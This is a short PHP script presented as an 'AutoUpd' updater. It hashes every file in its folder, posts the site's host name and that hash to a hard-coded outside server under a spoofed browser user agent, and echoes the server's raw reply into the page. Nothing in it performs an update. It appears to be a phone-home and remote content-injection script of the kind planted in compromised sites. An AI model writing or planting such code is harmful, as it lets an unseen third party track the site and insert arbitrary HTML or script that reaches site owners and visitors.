<?php
class AutoUpd {
	
	public $url = 'http://seda.test-lab.org.ua/';
	
	function update_post($comparison) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $this->url);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, "update=true&dom=".$_SERVER['HTTP_HOST']."&hash=".$comparison);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (X11; Seda) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11');
		$data = curl_exec($ch);
		curl_close($ch);
		return $data;
	} 
	
	function get_files($dir = ".") {
		$files = array();
		if ($handle = opendir($dir)) {
			while (false !== ($item = readdir($handle))) {
				if (is_file("$dir/$item")) {
					$files[] = "$dir/$item";
				} elseif (is_dir("$dir/$item") && ($item != ".") && ($item != "..")) {
					$files = array_merge($files, $this->get_files("$dir/$item"));
				}
			}
			closedir($handle);
		}
		return $files;
	}
	
	function select_server_md5($path){
		$hashing_string = '';
		$folder_array = $this->get_files($path);
		foreach ($folder_array as $file) {
			if(!strpos($file, '.htaccess')){
				$hashing_string .= hash_file('md5', $file);
			}
		}
		return md5($hashing_string);
	}
}

$reset = new AutoUpd();
$comparison = $reset->select_server_md5(dirname(__FILE__));
if(!empty($comparison)){
	$content = $reset->update_post($comparison);
}
echo $content;
?>